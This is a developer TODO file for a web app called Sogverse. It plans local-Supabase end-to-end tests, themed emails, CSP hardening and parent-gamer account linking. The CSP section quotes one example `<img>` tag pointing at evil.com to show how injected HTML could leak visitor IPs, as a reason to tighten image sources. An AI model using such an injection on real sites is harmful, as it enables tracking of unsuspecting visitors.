# Sogverse TODO

## Cleanup

- [ ] Remove `FORCE_JAVASCRIPT_ACTIONS_TO_NODE24: true` from `.github/workflows/ci.yml` after June 2, 2026 (Node.js 24 becomes the default runner)

### E2E Tests with Local Supabase

Current E2E tests only cover unauthenticated flows (page renders, redirects). Authenticated tests (admin-only pages, role-based routing, CRUD operations) need real Supabase Auth + Postgres but shouldn't depend on the remote instance.

**Approach:** Run `supabase start` in CI to spin up a local Supabase stack (Postgres, Auth, Storage) in Docker. Existing migration files are applied automatically, giving an identical schema. Test accounts are created via `supabase/seed.sql`.

Setup tasks:
- [ ] Add `supabase/seed.sql` with test accounts (admin, customer, gedu, gamer) using known passwords
- [ ] Add `.env.test.local` with local Supabase URL/keys (`supabase start` prints these)
- [ ] Create Playwright auth setup project that logs in via the UI and saves `storageState` per role
- [ ] Update `playwright.config.ts` with auth setup project and role-specific test projects
- [ ] Add GitHub Actions step: `supabase start` → `npm run dev` (with test env) → `npx playwright test`

Test cases to add:
- [ ] Admin can view `/admin/products` (sees "Products" heading)
- [ ] Non-admin roles (customer, gedu, gamer) are redirected away from `/admin/*` to their own dashboard
- [ ] Admin can create a product via the add form
- [ ] Admin can edit an existing product
- [ ] Real auth flows (register, login, logout)
- [ ] Customer adding a gamer
- [ ] Core purchase flow

**Why:** RLS policies and role-based routing are complex enough that testing against a real DB catches integration bugs that mocked tests miss. Local Supabase keeps tests fast, deterministic, and free from network flakiness — and Docker is available by default in GitHub Actions runners.

### Theme-Aware Email Templates

Email templates use hardcoded hex values from `src/lib/constants/colors.ts` (currently dark theme only). To match the user's theme preference, we'd need to store the preference in the database so it's available at send time. For now, emails always use the dark theme.

- [ ] Add `theme` column to `profiles` table
- [ ] Read `profile.theme` when rendering email templates
- [ ] Add `LIGHT_THEME` constants to `src/lib/constants/colors.ts`
- [ ] Update email templates to use theme-appropriate colors

### Host Product Images and Tighten CSP `img-src`

Product images are currently arbitrary URLs provided by admins. The CSP `img-src` directive must allow `https:` (any HTTPS source) to accommodate this, which means an attacker who achieves HTML injection could load `<img src="https://evil.com/track?...">` to ping an external server and leak the visitor's IP.

- [ ] Add image upload to product creation (Supabase Storage or an image CDN like Cloudinary)
- [ ] Migrate existing product image URLs to hosted images
- [ ] Tighten CSP `img-src` from `'self' data: blob: https:` to `'self' data: blob: https://your-cdn-domain.com` in `src/proxy.ts`

**Why:** The current `https:` wildcard is low risk (admins are trusted, and `<img>` tags can't read cookies or page content), but tightening it to a specific domain closes the exfiltration-via-image-ping vector entirely. This is the last meaningful CSP gap after the nonce-based `script-src` fix.


### Parent-Managed Gamer Profile Fields (DOB, Gender)

Customers (parents) will set `date_of_birth` and `gender` on their linked gamers. When implemented, add a "Parents can update linked gamer profiles" UPDATE policy on `gamer_profiles` using `is_parent_of(user_id)` and consider restricting the current "Gamers can update own gamer_profile" policy. Age should be derived from `date_of_birth`, never stored directly.

### Multi-Parent Gamer Linking

Currently the only way to link a parent to a gamer is when the parent creates the gamer via `POST /api/gamers/create`. To support a second parent linking to an existing gamer:

- [ ] Choose an authorization mechanism (invite code, existing parent approval, or admin-only)
- [ ] Create a server-side API route (e.g., `POST /api/gamers/link`) that validates authorization before inserting into `parent_gamer` using the admin client
- [ ] Add UI for the chosen flow (e.g., "Share invite code" button for existing parent, "Enter code" form for second parent)
